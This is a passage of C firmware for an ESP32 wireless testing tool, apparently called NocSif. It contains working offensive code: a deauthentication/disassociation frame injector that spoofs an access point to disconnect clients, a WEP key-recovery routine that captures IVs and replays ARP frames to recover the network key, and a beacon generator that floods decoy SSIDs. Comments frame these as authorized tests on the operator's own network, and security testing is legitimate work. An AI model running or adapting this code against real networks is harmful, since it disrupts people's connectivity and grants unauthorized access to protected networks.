    f[2] = 0x00; f[3] = 0x00;                          /* duration field */
    memcpy(&f[4],  s_tx_client, 6);                    /* addr1: the destination */
    memcpy(&f[10], s_tx_bssid,  6);                    /* addr2: the source, spoofing the AP */
    memcpy(&f[16], s_tx_bssid,  6);                    /* addr3: the BSSID */
    f[22] = 0x00; f[23] = 0x00;                        /* sequence number, which the system may override */
    f[24] = 0x07; f[25] = 0x00;                        /* reason 7: a class-3 frame from a non-associated station */
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false);
    if (e == ESP_OK) {
        s_tx_count++;
    }
    if (!s_tx_logged) {                                /* one-shot: confirms raw TX is actually permitted */
        s_tx_logged = true;
        ESP_LOGW(TAG, "mgmt-tx first frame -> %s", esp_err_to_name(e));
    }
    bool broadcast = true;
    for (int i = 0; i < 6; i++) { if (s_tx_client[i] != 0xFF) { broadcast = false; break; } }
    if (!broadcast) {                                  /* the reverse direction (client to AP) too */
        memcpy(&f[4],  s_tx_bssid,  6);
        memcpy(&f[10], s_tx_client, 6);
        if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false) == ESP_OK) {
            s_tx_count++;
        }
    }
}

/* the periodic transmit and rate sampler, on the esp_timer task, off the LVGL task */
static void mgmt_tx_tick(void *arg)
{
    (void)arg;
    if (!s_tx_active) {
        return;
    }
    mgmt_tx_fire();
    int64_t now = esp_timer_get_time();
    int64_t dt = now - s_tx_rate_t0;
    if (dt >= 1000000) {                               /* a roughly 1s window */
        s_tx_rate = (uint32_t)((int64_t)(s_tx_count - s_tx_rate_base) * 1000000 / dt);
        s_tx_rate_base = s_tx_count;
        s_tx_rate_t0 = now;
    }
}

static void do_mgmt_tx_target(const uint8_t bssid[6], int channel, const char *ssid)
{
    memcpy(s_tx_bssid, bssid, 6);
    s_tx_channel = (channel >= 1 && channel <= 13) ? (uint8_t)channel : 1;
    snprintf(s_tx_ssid, sizeof s_tx_ssid, "%s", ssid ? ssid : "");
    s_tx_have_target = true;
    if (s_tx_active) {
        do_mon_chan(s_tx_channel);                     /* re-locks to the new target's channel */
    }
    ESP_LOGI(TAG, "mgmt-tx target %02x:%02x:%02x:%02x:%02x:%02x ch %d (%s)",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], s_tx_channel,
             s_tx_ssid[0] ? s_tx_ssid : "hidden");
}

static void do_mgmt_tx_on(void)
{
    if (s_tx_active) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!s_tx_have_target) {
        ESP_LOGW(TAG, "mgmt-tx: no target selected");
        return;
    }
    if (!s_mon_active && !s_pending_monitor) {          /* the radio must be up on a channel */
        do_monitor_on();
    }
    if (!s_mon_active && !s_pending_monitor) {
        ESP_LOGW(TAG, "mgmt-tx: monitor did not start");
        return;
    }
    do_mon_chan(s_tx_channel);                          /* holds the target's channel */
    s_tx_count = 0;
    s_tx_rate = 0;
    s_tx_rate_base = 0;
    s_tx_rate_t0 = esp_timer_get_time();
    s_tx_logged = false;                                /* re-logs the first TX result this session */
    if (s_tx_timer == NULL) {
        const esp_timer_create_args_t a = { .callback = mgmt_tx_tick, .name = "wifimgmttx" };
        if (esp_timer_create(&a, &s_tx_timer) != ESP_OK) {
            ESP_LOGE(TAG, "mgmt-tx: timer create failed");
            return;
        }
    }
    s_tx_active = true;
    esp_timer_start_periodic(s_tx_timer, 100000);      /* 100ms, giving roughly 10-20 frames/s, bounded */
    ESP_LOGW(TAG, "mgmt-tx ON (%s) -> %02x:%02x:%02x:%02x:%02x:%02x ch %d",
             s_tx_disassoc ? "disassoc" : "deauth",
             s_tx_bssid[0], s_tx_bssid[1], s_tx_bssid[2],
             s_tx_bssid[3], s_tx_bssid[4], s_tx_bssid[5], s_tx_channel);
}

static void do_mgmt_tx_off(void)
{
    if (!s_tx_active) {
        return;
    }
    s_tx_active = false;
    if (s_tx_timer) {
        esp_timer_stop(s_tx_timer);
    }
    ESP_LOGI(TAG, "mgmt-tx OFF (%u frames)", (unsigned)s_tx_count);
}

/* ---- WEP key recovery (#4, active — authorized testing, the operator's OWN network) --- *
 * parse_wep() derives IV + keystream from each of the target's WEP data frames (XOR of the known
 * LLC/SNAP + ARP/IP plaintext against the ciphertext) and pushes a sample to the SPSC ring; the
 * PSRAM-stack wep_worker_task drains it into the wep_recover core and runs the recovery pass. An
 * esp_timer re-injects one captured ARP frame to farm fresh IVs (reuses the raw-TX override). The
 * RC4/keystream math lives in the portable wep_recover.{c,h}; this is only the radio glue. */

/* Cooperative-yield hook for the recovery worker: the try() pass is CPU-bound, so it periodically
 * lets the idle task run (feeds the task WDT) and lower-priority work proceed. */
static void wep_yield_cb(void *arg) { (void)arg; vTaskDelay(1); }

/* Decode one captured WEP data frame from the target and push (IV, keystream) to the ring. Runs on
 * the parser task (off the rx hot path). Also stashes the first ARP frame for the replay farm. */
static void parse_wep(const cap_slot_t *s, const uint8_t *d)
{
    /* Known leading plaintext: LLC/SNAP (always) + the ARP fixed header (for an ARP frame). Indices
     * 0..5 are the SNAP bytes present in every LLC/SNAP frame; 6..14 are the ARP EtherType+header. */
    static const uint8_t KP_ARP[15] = { 0xAA,0xAA,0x03,0x00,0x00,0x00, 0x08,0x06,
                                        0x00,0x01,0x08,0x00,0x06,0x04,0x00 };
    int len = s->cap_len;
    if (len < 28) return;                                 /* need at least a header + IV + a little */
    bool tods   = (d[1] & 0x01) != 0;
    bool fromds = (d[1] & 0x02) != 0;
    const uint8_t *bssid = fromds ? (d + 10) : (tods ? (d + 4) : (d + 16));  /* addr2 / addr1 / addr3 */
    if (memcmp(bssid, s_wep_bssid, 6) != 0) return;       /* only the selected target AP */

    uint8_t fsub = (d[0] >> 4) & 0xF;
    int hdr = 24;
    if (tods && fromds) hdr += 6;                         /* 4-address (WDS) header */
    if (fsub & 0x08)    hdr += 2;                         /* QoS control            */
    if (hdr + 4 + 6 > len) return;                        /* need IV(4) + >=6 ciphertext bytes */

    const uint8_t *iv = d + hdr;                          /* 3-byte IV + 1-byte KeyID */
    const uint8_t *ct = d + hdr + 4;                      /* WEP-encrypted body (LLC/SNAP...) */
    int ctlen = len - hdr - 4;
    s_wep_data_frames++;

    /* ARP frames give the longest known plaintext (needed for the upper key bytes). Identify one by
     * its length: encrypted payload = LLC/SNAP(8) + ARP(28) + ICV(4) = 40, then the 802.11 FCS(4).
     * The captured orig_len may or may not include the FCS, so accept both 40 and 44. */
    int paylen = (int)s->orig_len - hdr - 4;              /* encrypted body (+ICV) [+FCS] */
    bool is_arp = (paylen == 40 || paylen == 44);

    wep_samp_t samp;
    samp.iv[0] = iv[0]; samp.iv[1] = iv[1]; samp.iv[2] = iv[2];
    int n = 0, want = (is_arp && ctlen >= 15) ? 15 : (ctlen >= 6 ? 6 : ctlen);
    for (n = 0; n < want; n++) samp.ks[n] = (uint8_t)(ct[n] ^ KP_ARP[n]);
    samp.ks_len = (uint8_t)n;

    if (s_wep_ring && n >= 1) {                            /* push to the SPSC ring (worker drains) */
        uint32_t tail = s_wep_ring_tail;                                       /* sole producer */
        uint32_t head = __atomic_load_n(&s_wep_ring_head, __ATOMIC_ACQUIRE);
        if ((tail - head) >= WEP_RING_SLOTS) {
            s_wep_ring_drop++;
        } else {
            s_wep_ring[tail & (WEP_RING_SLOTS - 1)] = samp;
            __atomic_store_n(&s_wep_ring_tail, tail + 1, __ATOMIC_RELEASE);
        }
    }

    /* Stash the first ARP frame for the replay farm. The replayable frame is exactly hdr + IV(4) +
     * encrypted(40) bytes (no FCS — the driver appends its own on TX). */
    if (is_arp && s_wep_arp_len == 0 && s_wep_replay) {
        int flen = hdr + 4 + 40;
        if (flen <= (int)sizeof s_wep_arp && flen <= len) {
            memcpy(s_wep_arp, d, (size_t)flen);
            s_wep_arp_len = flen;                          /* publish last: >0 means valid */
        }
    }
}

/* Re-inject the captured ARP frame so the AP emits a fresh-IV response (esp_timer task). */
static void wep_replay_fire(void *arg)
{
    (void)arg;
    if (!s_wep_active || !s_wep_replay || !s_mon_active || s_wep_arp_len <= 0) return;
    if (esp_wifi_80211_tx(WIFI_IF_STA, s_wep_arp, s_wep_arp_len, false) == ESP_OK) {
        s_wep_replays++;
    }
}

/* Recovery worker: owns the wep_recover context, drains the sample ring, runs the CPU-bound pass at
 * increasing IV thresholds, and publishes progress + the recovered key. PSRAM stack. */
static void wep_worker_task(void *arg)
{
    (void)arg;
    wep_recover_cfg_t cfg;
    memset(&cfg, 0, sizeof cfg);
    cfg.key_len     = (uint8_t)s_wep_cfg_keylen;                          /* 0 auto / 5 / 13 */
    cfg.max_samples = (s_wep_cfg_keylen == WEP_KEY40_LEN) ? 55000u : 120000u;
    wep_recover_ctx_t ctx;
    if (!wep_recover_ctx_init_cfg(&ctx, &cfg)) {
        ESP_LOGE(TAG, "wep: ctx init failed (PSRAM ~%u KB)",
                 (unsigned)((cfg.max_samples * 19u + cfg.max_samples * 8u) / 1024u));
        s_wep_state = NOCSIF_WEP_FAILED;
        s_wep_task = NULL;
        vTaskDeleteWithCaps(NULL);
        return;
    }
    wep_recover_set_yield(&ctx, wep_yield_cb, NULL);

    uint32_t next_try = (s_wep_cfg_keylen == WEP_KEY104_LEN) ? 100000u : 40000u;
    while (s_wep_active) {
        uint32_t head = s_wep_ring_head;                                     /* sole consumer */
        uint32_t tail = __atomic_load_n(&s_wep_ring_tail, __ATOMIC_ACQUIRE);
        while (head != tail) {
            const wep_samp_t *smp = &s_wep_ring[head & (WEP_RING_SLOTS - 1)];
            wep_recover_add_sample(&ctx, smp->iv, smp->ks, smp->ks_len);
            head++;
        }
        __atomic_store_n(&s_wep_ring_head, head, __ATOMIC_RELEASE);

        uint32_t u = wep_recover_unique_ivs(&ctx);
        s_wep_unique   = u;
        s_wep_progress = wep_recover_progress(&ctx);

        if (u >= next_try) {
            uint8_t key[WEP_KEY_MAX_LEN], klen = 0;
            uint32_t need = 0;
            wep_recover_status_t st = wep_recover_try(&ctx, key, &klen, &need);
            if (st == WEP_RECOVER_RECOVERED && klen > 0) {
                static const char hexd[] = "0123456789abcdef";
                int j = 0; bool printable = true;
                memcpy(s_wep_key, key, klen);
                for (int i = 0; i < klen; i++) {
                    if (i) s_wep_key_hex[j++] = ':';
                    s_wep_key_hex[j++] = hexd[(key[i] >> 4) & 0xF];
                    s_wep_key_hex[j++] = hexd[key[i] & 0xF];
                    if (key[i] < 0x20 || key[i] >= 0x7F) printable = false;
                }
                s_wep_key_hex[j] = '\0';
                if (printable) { memcpy(s_wep_key_ascii, key, klen); s_wep_key_ascii[klen] = '\0'; }
                else           { s_wep_key_ascii[0] = '\0'; }
                s_wep_key_bytes = klen;
                if (s_wep_replay_timer) esp_timer_stop(s_wep_replay_timer);   /* no more replay farming */
                s_wep_active = false;                        /* stop feeding parse_wep; capture stays for the UI */
                s_wep_state = NOCSIF_WEP_RECOVERED;
                ESP_LOGW(TAG, "wep: RECOVERED %d-bit key after %u unique IVs", klen * 8, (unsigned)u);
                break;
            }
            next_try = u + 20000u;                          /* try again as more IVs come in */
        }
        vTaskDelay(pdMS_TO_TICKS(250));
    }

    wep_recover_ctx_free(&ctx);
    s_wep_task = NULL;
    vTaskDeleteWithCaps(NULL);
}

static void do_wep_on(const uint8_t bssid[6], int channel, int key_len, const char *ssid)
{
    if (s_wep_active) return;
    if (s_wep_task != NULL) { ESP_LOGW(TAG, "wep: previous worker still exiting — retry"); return; }
    if (nocsif_reliability_safe_mode()) { s_wep_state = NOCSIF_WEP_FAILED; return; }

    memcpy(s_wep_bssid, bssid, 6);
    snprintf(s_wep_ssid, sizeof s_wep_ssid, "%s", ssid ? ssid : "");
    s_wep_cfg_keylen = (key_len == WEP_KEY40_LEN || key_len == WEP_KEY104_LEN) ? key_len : 0;
    int ch = (channel >= 1 && channel <= 13) ? channel : 1;

    s_wep_data_frames = s_wep_unique = s_wep_replays = 0;
    s_wep_progress = 0; s_wep_arp_len = 0; s_wep_key_bytes = 0;
    s_wep_key_hex[0] = s_wep_key_ascii[0] = '\0';
    s_wep_ring_head = s_wep_ring_tail = s_wep_ring_drop = 0;

    if (s_wep_ring == NULL) {                               /* SPSC sample ring, held for the session */
        s_wep_ring = heap_caps_malloc(sizeof(wep_samp_t) * WEP_RING_SLOTS, MALLOC_CAP_SPIRAM);
        if (s_wep_ring == NULL) { ESP_LOGE(TAG, "wep: sample-ring alloc failed"); s_wep_state = NOCSIF_WEP_FAILED; return; }
    }

    do_parse_on();                                         /* capture + parser (drops any STA link) */
    if (!s_mon_active && !s_pending_monitor) {
        ESP_LOGW(TAG, "wep: capture did not start");
        s_wep_state = NOCSIF_WEP_FAILED;
        return;
    }
    do_mon_chan(ch);                                       /* hold the target's channel */

    s_wep_state  = NOCSIF_WEP_COLLECTING;
    s_wep_active = true;                                   /* arms parse_wep + the fuller WEP snaplen */
    if (xTaskCreateWithCaps(wep_worker_task, "wifiwep", 32768, NULL, 2, &s_wep_task, MALLOC_CAP_SPIRAM) != pdPASS) {
        ESP_LOGE(TAG, "wep: worker task create failed");
        s_wep_active = false;
        s_wep_state  = NOCSIF_WEP_FAILED;
        return;
    }
    if (s_wep_replay) {                                    /* interactive ARP replay accelerator */
        if (s_wep_replay_timer == NULL) {
            const esp_timer_create_args_t a = { .callback = wep_replay_fire, .name = "wifiwepreplay" };
            esp_timer_create(&a, &s_wep_replay_timer);
        }
        if (s_wep_replay_timer) esp_timer_start_periodic(s_wep_replay_timer, 5000);   /* 5 ms → ~200/s */
    }
    ESP_LOGW(TAG, "wep: recovery ON -> %02x:%02x:%02x:%02x:%02x:%02x ch %d keylen %d replay %d",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ch, s_wep_cfg_keylen, (int)s_wep_replay);
}

static void do_wep_off(void)
{
    if (s_wep_replay_timer) esp_timer_stop(s_wep_replay_timer);
    if (!s_wep_active) return;
    s_wep_active = false;                                   /* worker loop exits, frees its ctx, self-deletes */
    if (s_wep_state == NOCSIF_WEP_COLLECTING) s_wep_state = NOCSIF_WEP_IDLE;
    ESP_LOGI(TAG, "wep: recovery OFF (%u IVs, %u replays, %u frames)",
             (unsigned)s_wep_unique, (unsigned)s_wep_replays, (unsigned)s_wep_data_frames);
}

/* ---- beacon TX (M5-P5·2, active — authorized testing) ------------------------------- *
 * Advertises N decoy networks by transmitting beacon frames, each with a distinct
 * locally-administered BSSID and a generated "NocSif-NN" SSID (deliberately our own name — it does
 * not impersonate a real network). Reuses the P5·1 raw-TX override. */

/* A deterministic, unique locally-administered BSSID per decoy index (02:4E:6F:63:hi:lo). */
static void beacon_bssid(uint8_t out[6], int idx)
{
    out[0] = 0x02; out[1] = 0x4E; out[2] = 0x6F; out[3] = 0x63;  /* 0x02 means locally administered */
    out[4] = (uint8_t)((idx >> 8) & 0xFF);
    out[5] = (uint8_t)(idx & 0xFF);
}

/* Builds one beacon frame: header plus fixed parameters plus SSID/rates/DS-param IEs. Returns its length. */
static int beacon_build(uint8_t *f, const uint8_t bssid[6], const char *ssid, uint8_t channel)
{
    int n = 0;
    f[n++] = 0x80; f[n++] = 0x00;                     /* frame control: management, subtype 8 (beacon) */
    f[n++] = 0x00; f[n++] = 0x00;                     /* duration field */
    memset(&f[n], 0xFF, 6); n += 6;                   /* addr1: broadcast */
    memcpy(&f[n], bssid, 6); n += 6;                  /* addr2: the BSSID */
    memcpy(&f[n], bssid, 6); n += 6;                  /* addr3: the BSSID */
    f[n++] = 0x00; f[n++] = 0x00;                     /* sequence number */
    memset(&f[n], 0, 8); n += 8;                      /* timestamp */
    f[n++] = 0x64; f[n++] = 0x00;                     /* beacon interval: 100 TU */
    f[n++] = 0x01; f[n++] = 0x00;                     /* capability: ESS */
    int slen = (int)strlen(ssid); if (slen > 32) slen = 32;
    f[n++] = 0x00; f[n++] = (uint8_t)slen;            /* SSID IE, tag 0 */
    memcpy(&f[n], ssid, slen); n += slen;
    f[n++] = 0x01; f[n++] = 0x08;                     /* supported rates IE, tag 1 */
    f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8B; f[n++] = 0x96;
    f[n++] = 0x0C; f[n++] = 0x12; f[n++] = 0x18; f[n++] = 0x24;
    f[n++] = 0x03; f[n++] = 0x01; f[n++] = channel;   /* DS parameter set IE, tag 3: the channel */
    return n;
}

/* ---- beacon SSID list: managed by the UI, persisted to NVS ---- */

/* Saves the whole list to NVS: count plus each index's SSID and enabled
 * flag. Snapshots the list under the lock first, then does the actual flash
 * I/O outside the lock. Called after every mutation, on the LVGL task, so
 * this runs infrequently. */
static void beacon_persist(void)
{
    bcn_entry_t local[BCN_MAX];
    int cnt;
    portENTER_CRITICAL(&s_bcn_mux);
    cnt = s_bcn_cnt;
    memcpy(local, s_bcn, sizeof(bcn_entry_t) * (cnt < 0 ? 0 : cnt));
    portEXIT_CRITICAL(&s_bcn_mux);

    nocsif_settings_set_i32("bc_cnt", cnt);
    for (int i = 0; i < cnt; i++) {
        char k[12];
        snprintf(k, sizeof k, "bc_s%d", i); nocsif_settings_set_str(k, local[i].ssid);
        snprintf(k, sizeof k, "bc_e%d", i); nocsif_settings_set_i32(k, local[i].en ? 1 : 0);
    }
}

/* Loads the list from NVS once; safe to call more than once. Reads outside the lock, publishes under the lock. */
static void beacon_ensure_loaded(void)
{
    if (s_bcn_loaded) {
        return;
    }
    s_bcn_loaded = true;                              /* set first, so a concurrent caller skips the load */
    int cnt = nocsif_settings_get_i32("bc_cnt", 0);
    if (cnt < 0) cnt = 0;
    if (cnt > BCN_MAX) cnt = BCN_MAX;
    for (int i = 0; i < cnt; i++) {
        char k[12], sbuf[WIFI_SSID_MAX];
        snprintf(k, sizeof k, "bc_s%d", i);
        nocsif_settings_get_str(k, sbuf, sizeof sbuf, "");
        if (!sbuf[0]) continue;
        snprintf(k, sizeof k, "bc_e%d", i);
        int en = nocsif_settings_get_i32(k, 1);
        portENTER_CRITICAL(&s_bcn_mux);
        if (s_bcn_cnt < BCN_MAX) {
            memcpy(s_bcn[s_bcn_cnt].ssid, sbuf, sizeof s_bcn[s_bcn_cnt].ssid);
            s_bcn[s_bcn_cnt].en = (en != 0);
            s_bcn_cnt++;
        }
        portEXIT_CRITICAL(&s_bcn_mux);
    }
    s_bcn_gen++;
}

int nocsif_wifi_beacon_count(void)
{
    beacon_ensure_loaded();
    return s_bcn_cnt;
}

uint32_t nocsif_wifi_beacon_gen(void) { return s_bcn_gen; }

bool nocsif_wifi_beacon_get(int idx, char *out, size_t len, bool *en)
{
    beacon_ensure_loaded();
    bool ok = false;
    portENTER_CRITICAL(&s_bcn_mux);
    if (idx >= 0 && idx < s_bcn_cnt) {
        if (out && len) { snprintf(out, len, "%s", s_bcn[idx].ssid); }
        if (en) { *en = s_bcn[idx].en; }
        ok = true;
    }
    portEXIT_CRITICAL(&s_bcn_mux);
    return ok;
}

bool nocsif_wifi_beacon_add(const char *ssid)
{
    beacon_ensure_loaded();
    if (!ssid || !ssid[0]) {
        return false;
    }
    char clean[WIFI_SSID_MAX];
    snprintf(clean, sizeof clean, "%s", ssid);        /* truncates to 32 characters */
    bool ok = false;
    portENTER_CRITICAL(&s_bcn_mux);
    bool dup = false;
    for (int i = 0; i < s_bcn_cnt; i++) {
        if (strcmp(s_bcn[i].ssid, clean) == 0) { dup = true; break; }
    }
    if (!dup && s_bcn_cnt < BCN_MAX) {
        memcpy(s_bcn[s_bcn_cnt].ssid, clean, sizeof clean);
        s_bcn[s_bcn_cnt].en = true;
        s_bcn_cnt++;
        ok = true;
    }
    portEXIT_CRITICAL(&s_bcn_mux);
    if (ok) { s_bcn_gen++; beacon_persist(); }
    return ok;
}

void nocsif_wifi_beacon_remove(int idx)
{
    beacon_ensure_loaded();
    bool ok = false;
    portENTER_CRITICAL(&s_bcn_mux);
    if (idx >= 0 && idx < s_bcn_cnt) {
        for (int i = idx; i < s_bcn_cnt - 1; i++) {
            s_bcn[i] = s_bcn[i + 1];
        }
        s_bcn_cnt--;
        ok = true;
    }
    portEXIT_CRITICAL(&s_bcn_mux);
    if (ok) { s_bcn_gen++; beacon_persist(); }
}

void nocsif_wifi_beacon_rename(int idx, const char *ssid)
{
    beacon_ensure_loaded();
    if (!ssid || !ssid[0]) {
        return;
    }
    char clean[WIFI_SSID_MAX];
    snprintf(clean, sizeof clean, "%s", ssid);
    bool ok = false;
    portENTER_CRITICAL(&s_bcn_mux);
    if (idx >= 0 && idx < s_bcn_cnt) {
        memcpy(s_bcn[idx].ssid, clean, sizeof clean);
        ok = true;
    }
    portEXIT_CRITICAL(&s_bcn_mux);
    if (ok) { s_bcn_gen++; beacon_persist(); }
}

void nocsif_wifi_beacon_toggle(int idx)
{
    beacon_ensure_loaded();
    bool ok = false;
    portENTER_CRITICAL(&s_bcn_mux);
    if (idx >= 0 && idx < s_bcn_cnt) {
        s_bcn[idx].en = !s_bcn[idx].en;
        ok = true;
    }
    portEXIT_CRITICAL(&s_bcn_mux);
    if (ok) { s_bcn_gen++; beacon_persist(); }
}

/* Appends up to `n` generated "NocSif-NN" decoy names, skipping duplicates and respecting BCN_MAX. */
void nocsif_wifi_beacon_add_decoys(int n)
{
    beacon_ensure_loaded();
    int added = 0;
    for (int i = 1; i <= 99 && added < n; i++) {
        char name[WIFI_SSID_MAX];
        snprintf(name, sizeof name, "NocSif-%02d", i);
        if (nocsif_wifi_beacon_add(name)) added++;    /* add() itself dedups and persists each entry */
    }
}

/* the count of currently enabled entries — the ones that will actually transmit */
static int beacon_enabled_count(void)
{
    int c = 0;
    portENTER_CRITICAL(&s_bcn_mux);
    for (int i = 0; i < s_bcn_cnt; i++) { if (s_bcn[i].en) c++; }
    portEXIT_CRITICAL(&s_bcn_mux);
    return c;
}

/* Emits one beacon for each enabled SSID, on the esp_timer task, off the
 * LVGL task. Snapshots the enabled entries under the lock into a static
 * scratch buffer (the esp_timer task is single-threaded), then transmits
 * outside the lock — the spinlock is never held across an
 * esp_wifi_80211_tx call. */
static bcn_entry_t s_bcn_snap[BCN_MAX];
static void beacon_tx_fire(void)
{
    if (!s_bcn_active || !s_mon_active) {
        return;
    }
    int m = 0;
    portENTER_CRITICAL(&s_bcn_mux);
    for (int i = 0; i < s_bcn_cnt; i++) {
        if (s_bcn[i].en) { s_bcn_snap[m++] = s_bcn[i]; }
    }
    portEXIT_CRITICAL(&s_bcn_mux);

    uint8_t f[80];
    int ch = (s_mon_chan >= 1 && s_mon_chan <= 13) ? s_mon_chan : 1;
    for (int i = 0; i < m; i++) {
        uint8_t bssid[6];
        beacon_bssid(bssid, i);
        int len = beacon_build(f, bssid, s_bcn_snap[i].ssid, (uint8_t)ch);
        if (esp_wifi_80211_tx(WIFI_IF_STA, f, len, false) == ESP_OK) {
            s_bcn_frames++;
        }
    }
}

static void beacon_tx_tick(void *arg)
{
    (void)arg;
    if (!s_bcn_active) {
        return;
    }
    beacon_tx_fire();
    int64_t now = esp_timer_get_time();
    int64_t dt = now - s_bcn_rate_t0;
    if (dt >= 1000000) {                               /* a roughly 1s window */
        s_bcn_rate = (uint32_t)((int64_t)(s_bcn_frames - s_bcn_rate_base) * 1000000 / dt);
        s_bcn_rate_base = s_bcn_frames;
        s_bcn_rate_t0 = now;
    }
}

static void do_beacon_on(void)
{
    if (s_bcn_active) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (beacon_enabled_count() <= 0) {                  /* nothing to advertise */
        ESP_LOGW(TAG, "beacon: no enabled SSIDs; not starting");
        return;
    }
    if (!s_mon_active && !s_pending_monitor) {          /* the radio must be up on a channel */
        do_monitor_on();
    }
    if (!s_mon_active && !s_pending_monitor) {
        ESP_LOGW(TAG, "beacon: monitor did not start");
        return;
    }
    do_mon_chan(s_mon_chan);                            /* holds a channel so the decoys appear stable */
    s_bcn_frames = 0;
    s_bcn_rate = 0;
    s_bcn_rate_base = 0;
    s_bcn_rate_t0 = esp_timer_get_time();
    if (s_bcn_timer == NULL) {
        const esp_timer_create_args_t a = { .callback = beacon_tx_tick, .name = "wifibeacon" };
        if (esp_timer_create(&a, &s_bcn_timer) != ESP_OK) {
            ESP_LOGE(TAG, "beacon: timer create failed");
            return;
        }
    }
    s_bcn_active = true;
    esp_timer_start_periodic(s_bcn_timer, 100000);      /* 100ms, so each SSID gets beaconed roughly 10x/s */
    ESP_LOGW(TAG, "beacon-tx ON (%d SSIDs, ch %d)", beacon_enabled_count(), s_mon_chan);
}

static void do_beacon_off(void)
{
    if (!s_bcn_active) {
        return;
    }
    s_bcn_active = false;
    if (s_bcn_timer) {
        esp_timer_stop(s_bcn_timer);
    }
    ESP_LOGI(TAG, "beacon-tx OFF (%u frames)", (unsigned)s_bcn_frames);
}

/* ---- software access point (M5-P5.3, active — authorized testing) ---- */

/* Primes the AP config from NVS once; safe to call more than once. Called at init and lazily by the getters/worker. */
static void ap_cfg_ensure_loaded(void)
{
    if (s_ap_cfg_loaded) {
        return;
    }
    s_ap_cfg_loaded = true;                           /* set first, so a concurrent caller skips the load */
    char buf[WIFI_SSID_MAX];
    nocsif_settings_get_str(K_AP_SSID, buf, sizeof buf, AP_SSID_DEF);
    portENTER_CRITICAL(&s_sap_mux);
    snprintf(s_ap_ssid, sizeof s_ap_ssid, "%s", buf[0] ? buf : AP_SSID_DEF);
    portEXIT_CRITICAL(&s_sap_mux);
    int ch = nocsif_settings_get_i32(K_AP_CHAN, 1);
    s_ap_channel = (ch >= 1 && ch <= 13) ? ch : 1;
    s_ap_hidden  = nocsif_settings_get_i32(K_AP_HIDDEN, 0) != 0;
}

/* Pushes the cached config into the driver as the AP config; worker
 * only, with the SSID copied out of the spinlock-guarded cache first.
 * Applied before start, and again live on a reconfigure. */
static void apply_ap_config(void)
{
    char ssid[WIFI_SSID_MAX];
    portENTER_CRITICAL(&s_sap_mux);
    memcpy(ssid, s_ap_ssid, sizeof ssid);
    portEXIT_CRITICAL(&s_sap_mux);
    if (ssid[0] == '\0') {
        snprintf(ssid, sizeof ssid, "%s", AP_SSID_DEF);
    }

    wifi_config_t wc = { 0 };
    snprintf((char *)wc.ap.ssid, sizeof wc.ap.ssid, "%s", ssid);
    wc.ap.ssid_len       = (uint8_t)strlen((char *)wc.ap.ssid);
    wc.ap.channel        = (uint8_t)((s_ap_channel >= 1 && s_ap_channel <= 13) ? s_ap_channel : 1);
    wc.ap.authmode       = WIFI_AUTH_OPEN;            /* open AP (software AP · captive portal), as shipped */
    wc.ap.ssid_hidden    = s_ap_hidden ? 1 : 0;
    wc.ap.max_connection = (uint8_t)((s_ap_maxconn >= 1 && s_ap_maxconn <= AP_CLI_MAX) ? s_ap_maxconn : 4);
    wc.ap.beacon_interval = 100;
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_config(WIFI_IF_AP, &wc));
}

/* Refreshes the connected-client snapshot off the LVGL task, on the
 * esp_timer. The driver's association table is the source of truth, and the
 * DHCP server's lease table fills in each client's IP. Publishes lock-free
 * into the inactive buffer, then flips the active index. There's only one
 * writer, this timer, so no lock is needed on the snapshot itself. */
static void ap_tick(void *arg)
{
    (void)arg;
    if (!s_ap_active) {
        return;
    }
    wifi_sta_list_t sl;
    if (esp_wifi_ap_get_sta_list(&sl) != ESP_OK) {
        sl.num = 0;
    }
    int w = s_ap_cli_i ^ 1;                           /* fills the inactive buffer */
    int cnt = 0;
    esp_netif_pair_mac_ip_t pairs[AP_CLI_MAX];
    for (int i = 0; i < sl.num && cnt < AP_CLI_MAX; i++) {
        memcpy(s_ap_cli[w][cnt].mac, sl.sta[i].mac, 6);
        s_ap_cli[w][cnt].rssi  = sl.sta[i].rssi;
        s_ap_cli[w][cnt].ip[0] = '\0';
        memcpy(pairs[cnt].mac, sl.sta[i].mac, 6);      /* MAC goes in, IP comes out */
        memset(&pairs[cnt].ip, 0, sizeof pairs[cnt].ip);
        cnt++;
    }
    if (cnt > 0 && s_ap_netif &&
        esp_netif_dhcps_get_clients_by_mac(s_ap_netif, cnt, pairs) == ESP_OK) {
        for (int i = 0; i < cnt; i++) {
            if (pairs[i].ip.addr != 0) {               /* 0 means no lease has been handed out yet */
                snprintf(s_ap_cli[w][i].ip, sizeof s_ap_cli[w][i].ip,
                         IPSTR, IP2STR(&pairs[i].ip));
            }
        }
    }
    /* a structural change versus the published buffer — either the count or the MAC set — bumps gen so the list rebuilds */
    int cur = s_ap_cli_i;
    bool changed = (cnt != s_ap_cli_cnt[cur]);
    for (int i = 0; !changed && i < cnt; i++) {
        if (memcmp(s_ap_cli[w][i].mac, s_ap_cli[cur][i].mac, 6) != 0) {
            changed = true;
        }
    }
    s_ap_cli_cnt[w] = cnt;
    s_ap_cli_i = w;                                    /* publishes atomically */
    if (changed) {
        s_ap_cli_gen++;
        refresh_strings();                             /* the client count feeds into the detail line */
    }
}

/* Drops the AP to a stopped radio in STA mode, without restarting it.
 * Shared by the Stop path — do_ap_off, which then restarts STA and
 * rejoins — and by the STA entry points, which start their own STA flow
 * afterward. */
static void ap_teardown(void)
{
    if (!s_ap_active) {
        return;
    }
    companion_stop();                                 /* §4.8a: the companion surface rides on the AP too */
    portal_stop();                                    /* the portal rides on the AP — drop it first */
    if (s_ap_timer) {
        esp_timer_stop(s_ap_timer);
    }
    s_ap_active = false;
    s_ap_cli_cnt[0] = s_ap_cli_cnt[1] = 0;
    s_ap_cli_i = 0;
    s_ap_cli_gen++;
    s_ap_ip[0] = '\0';
    esp_wifi_stop();                                  /* AP_STOP */
    s_sta_started = false;
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mode(WIFI_MODE_STA));
    publish_current_mac();                            /* puts the station MAC back into the readout */
    ESP_LOGI(TAG, "software AP OFF");
}

/* Get-or-create the single default Wi-Fi AP netif. The IDF default AP netif is a SINGLETON keyed on
